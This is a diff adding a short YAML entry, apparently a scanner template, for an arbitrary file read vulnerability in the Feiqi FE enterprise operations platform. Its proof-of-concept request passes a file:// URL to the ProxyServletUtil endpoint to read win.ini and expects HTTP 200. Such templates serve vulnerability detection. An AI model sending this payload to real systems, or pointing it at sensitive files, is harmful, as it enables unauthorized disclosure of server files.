@@ -1,0 +1,3 @@
+name: "飞企互联-FE企业运营管理平台ProxyServletUti存在任意文件读取漏洞"
+poc: "/ProxyServletUtil?url=file:///c:/Windows/win.ini"
+status_code: 200
